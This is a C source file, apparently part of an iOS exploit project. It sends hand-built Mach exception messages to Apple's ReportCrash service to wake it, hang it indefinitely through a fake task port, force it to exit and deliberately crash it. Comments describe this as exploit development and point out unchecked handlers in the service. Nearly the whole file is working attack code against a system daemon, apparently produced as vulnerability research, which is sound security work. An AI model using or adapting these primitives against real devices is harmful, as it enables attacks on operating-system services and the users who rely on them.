#include "blanket/reportcrash/reportcrash.h"

#include "blanket/log/log.h"

#include <assert.h>

const char REPORTCRASH_SERVICE_NAME[]           = "com.apple.ReportCrash";
const char REPORTCRASH_SAFETYNET_SERVICE_NAME[] = "com.apple.ReportCrash.SafetyNet";

// mach_exception_raise_state_identity message IDs.
#define MACH_EXCEPTION_RAISE_STATE_IDENTITY       (2407)
#define MACH_EXCEPTION_RAISE_STATE_IDENTITY_REPLY (MACH_EXCEPTION_RAISE_STATE_IDENTITY + 100)

// The request structure for mach_exception_raise_state_identity.
typedef struct __attribute__((packed)) {
	mach_msg_header_t          hdr;
	mach_msg_body_t            body;
	mach_msg_port_descriptor_t thread;
	mach_msg_port_descriptor_t task;
	NDR_record_t               NDR;
	uint32_t                   exception;
	uint32_t                   codeCnt;
	int64_t                    code[2];
	int32_t                    flavor;
	uint32_t                   old_stateCnt;
	uint32_t                   old_state[THREAD_STATE_MAX];
} Request__mach_exception_raise_state_identity_t;

// The reply structure for mach_exception_raise_state_identity.
typedef struct __attribute__((packed)) {
	mach_msg_header_t        hdr;
	NDR_record_t             NDR;
	kern_return_t            RetCode;
	int32_t                  flavor;
	mach_msg_type_number_t   new_stateCnt;
	uint32_t                 new_state[THREAD_STATE_MAX];
	mach_msg_audit_trailer_t trailer;
} Reply__mach_exception_raise_state_identity_t;

// Send a mach_exception_raise_state_identity message to the ReportCrash service, optionally
// waiting for a reply.
//
// Note that due to the peculiar implementation of ReportCrash, this is the only Mach message that
// we can send that will keep the process alive; any other message will cause ReportCrash to leave
// the Mach message processing loop and eventually exit.
static bool
reportcrash_send_mach_exception_raise_state_identity(
		mach_port_t reportcrash_service,
		mach_port_t thread_port,
		mach_port_t task_port,
		exception_type_t exception,
		void (^handle_reply)(mach_msg_header_t *)) {
	// We will send a Mach message to launchd that triggers the
	// mach_exception_raise_state_identity MIG service routine in ReportCrash. This service
	// routine, which is exposed over the "com.apple.ReportCrash" and
	// "com.apple.ReportCrash.SafetyNet" endpoints, also improperly calls
	// mach_port_deallocate() on the supplied task and thread ports, although we are not trying
	// to exploit this vulnerability.
	mach_port_t reply_port     = MACH_PORT_NULL;
	mach_msg_bits_t reply_type = 0;
	mach_msg_option_t options  = MACH_SEND_MSG;
	kern_return_t kr;
	// We only ask for a reply from ReportCrash if our caller has a handler for it.
	if (handle_reply != NULL) {
		reply_port  = mig_get_reply_port();
		reply_type  = MACH_MSG_TYPE_MAKE_SEND_ONCE;
		options    |= MACH_RCV_MSG
		           |  MACH_RCV_TRAILER_TYPE(MACH_MSG_TRAILER_FORMAT_0)
		           |  MACH_RCV_TRAILER_ELEMENTS(MACH_RCV_TRAILER_AUDIT);
	}
	// Create a buffer to hold the messages.
	typedef union {
		Request__mach_exception_raise_state_identity_t in;
		Reply__mach_exception_raise_state_identity_t   out;
	} Message;
	Message msg = {};
	// Populate the message.
	msg.in.hdr.msgh_bits              = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, reply_type, 0, MACH_MSGH_BITS_COMPLEX);
	msg.in.hdr.msgh_size              = sizeof(msg.in);
	msg.in.hdr.msgh_remote_port       = reportcrash_service;
	msg.in.hdr.msgh_local_port        = reply_port;
	msg.in.hdr.msgh_id                = MACH_EXCEPTION_RAISE_STATE_IDENTITY;
	msg.in.body.msgh_descriptor_count = 2;
	msg.in.thread.name                = thread_port;
	msg.in.thread.disposition         = MACH_MSG_TYPE_COPY_SEND;
	msg.in.thread.type                = MACH_MSG_PORT_DESCRIPTOR;
	msg.in.task.name                  = task_port;
	msg.in.task.disposition           = MACH_MSG_TYPE_COPY_SEND;
	msg.in.task.type                  = MACH_MSG_PORT_DESCRIPTOR;
	msg.in.exception                  = exception;
	msg.in.codeCnt                    = 2;
	msg.in.code[0]                    = 0;
	msg.in.code[1]                    = 0;
	msg.in.flavor                     = ARM_THREAD_STATE64;
	msg.in.old_stateCnt               = THREAD_STATE_MAX;
	// Send the message to ReportCrash. Also, silence the "taking address of packed member"
	// warning since it's incorrect here.
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Waddress-of-packed-member"
	kr = mach_msg(&msg.in.hdr,
			options,
			msg.in.hdr.msgh_size,
			sizeof(msg.out),
			reply_port,
			MACH_MSG_TIMEOUT_NONE,
			MACH_PORT_NULL);
	if (kr != KERN_SUCCESS) {
		ERROR("%s: 0x%x", "mach_msg", kr);
		return false;
	}
	// Give the message to the reply handler.
	if (handle_reply != NULL) {
		handle_reply(&msg.out.hdr);
	}
#pragma clang diagnostic pop
	return true;
}

bool
reportcrash_kickstart(mach_port_t reportcrash_service, pid_t *pid) {
	// Make ReportCrash generate a real report for us. That should wake it up. We could send an
	// exception type that doesn't generate a report, but at least during development of the
	// exploit we want the feedback this gives us.
	mach_port_t task_port   = mach_task_self();
	mach_port_t thread_port = mach_thread_self();
	__block bool reply_ok = true;
	bool send_ok = reportcrash_send_mach_exception_raise_state_identity(
			reportcrash_service,
			thread_port,
			task_port,
			EXC_BAD_ACCESS,
			^(mach_msg_header_t *hdr) {
		// Check that the reply message is the right type.
		if (hdr->msgh_id != MACH_EXCEPTION_RAISE_STATE_IDENTITY_REPLY) {
			ERROR("ReportCrash replied with unexpected message ID %u", hdr->msgh_id);
			reply_ok = false;
			return;
		}
		// Check that the return code indicates success.
		Reply__mach_exception_raise_state_identity_t *reply =
			(Reply__mach_exception_raise_state_identity_t *) hdr;
		if (reply->RetCode != KERN_SUCCESS) {
			WARNING("Unexpected result code from ReportCrash: %u", reply->RetCode);
		}
		// If the caller asked for it, get the PID.
		if (pid != NULL) {
			// The PID is the 5th component of the audit token.
			*pid = reply->trailer.msgh_audit.val[5];
		}
	});
	mach_port_deallocate(mach_task_self(), thread_port);
	if (!send_ok) {
		ERROR("Could not send kickstart message to ReportCrash");
	}
	return send_ok && reply_ok;
}

reportcrash_keepalive_assertion_t
reportcrash_keepalive(mach_port_t reportcrash_service) {
	// Allocate a fake port to serve as the task/thread port.
	mach_port_t fake_task_thread_port = MACH_PORT_NULL;
	kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE,
			&fake_task_thread_port);
	assert(kr == KERN_SUCCESS);
	kr = mach_port_insert_right(mach_task_self(), fake_task_thread_port, fake_task_thread_port,
			MACH_MSG_TYPE_MAKE_SEND);
	assert(kr == KERN_SUCCESS);
	// Send a mach_exception_raise_state_identity message that will cause ReportCrash to invoke
	// an RPC on the fake task port. As it happens, if we send EXC_CORPSE_NOTIFY, ReportCrash
	// will skip a lot of its checks and very quickly call task_policy_get() on the port. If we
	// don't reply to that message, it'll wait indefinitely. However, that means we can't wait
	// for a reply from ReportCrash either.
	bool send_ok = reportcrash_send_mach_exception_raise_state_identity(
			reportcrash_service,
			fake_task_thread_port,
			fake_task_thread_port,
			EXC_CORPSE_NOTIFY,
			NULL);
	if (!send_ok) {
		ERROR("Could not send fake exception message to ReportCrash");
		return 0;
	}
	// As long as we keep that port alive and don't reply, ReportCrash will be blocked and
	// prevented from exiting. To resume ReportCrash, simply destroy the Mach port.
	return (reportcrash_keepalive_assertion_t) fake_task_thread_port;
}

void
reportcrash_keepalive_assertion_release(reportcrash_keepalive_assertion_t assertion) {
	mach_port_t fake_task_thread_port = (mach_port_t) assertion;
	mach_port_destroy(mach_task_self(), fake_task_thread_port);
}

bool
reportcrash_exit(mach_port_t reportcrash_service) {
	kern_return_t kr;
	// Create a Mach message and reply.
	mach_port_t reply_port = mig_get_reply_port();
	typedef union {
		mach_msg_header_t hdr;
		struct {
			mig_reply_error_t  mig;
			mach_msg_trailer_t trailer;
		} reply;
	} Message;
	Message msg = {};
	msg.hdr.msgh_bits        = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE, 0, 0);
	msg.hdr.msgh_size        = sizeof(msg.hdr);
	msg.hdr.msgh_remote_port = reportcrash_service;
	msg.hdr.msgh_local_port  = reply_port;
	msg.hdr.msgh_id          = 0xaabbaabb;
	// Send the message.
	kr = mach_msg(&msg.hdr,
			MACH_SEND_MSG | MACH_RCV_MSG,
			msg.hdr.msgh_size,
			sizeof(msg.reply),
			reply_port,
			MACH_MSG_TIMEOUT_NONE,
			MACH_PORT_NULL);
	if (kr != KERN_SUCCESS) {
		ERROR("%s: 0x%x", "mach_msg", kr);
		return false;
	}
	if (msg.reply.mig.Head.msgh_size < sizeof(msg.reply.mig)) {
		ERROR("ReportCrash exit message reply too small");
		return false;
	}
	if (msg.reply.mig.RetCode != MIG_BAD_ID) {
		WARNING("ReportCrash exit message unexpected reply code %u",
				msg.reply.mig.RetCode);
	}
	return true;
}

bool
reportcrash_crash(mach_port_t reportcrash_service, bool wait) {
	// Alright, now we need to crash ReportCrash. I know it's hard to believe, but this is
	// super easy.
	//
	// For example, the GPU crash handler (message id 1091) does literally no checking on the
	// input message! Unfortunately, a lot (but not all) of those unchecked input bugs actually
	// result in a Jetsam event (due to allocating in a loop) rather than a proper crash, which
	// won't do for our purposes.
	//
	// However, it's even easier to crash ReportCrash with mach_exception_raise_state_identity.
	// I found this crasher by simply iterating over all the exception types.
	__block bool crashed = true;
	void (^handler)(mach_msg_header_t *) = NULL;
	if (wait) {
		handler = ^(mach_msg_header_t *hdr) {
			// If we actually crash ReportCrash, we should get a MACH_NOTIFY_SEND_ONCE
			// notification telling us that the send-once right in the request message
			// died.
			if (hdr->msgh_id != MACH_NOTIFY_SEND_ONCE) {
				ERROR("ReportCrash replied with unexpected message ID %u", hdr->msgh_id);
				crashed = false;
			}
		};
	}
	bool send_ok = reportcrash_send_mach_exception_raise_state_identity(
			reportcrash_service,
			mach_task_self(),
			MACH_PORT_NULL,
			EXC_CORPSE_NOTIFY,
			handler);
	if (!send_ok) {
		ERROR("Could not send crash message to ReportCrash");
	}
	return send_ok && crashed;
}
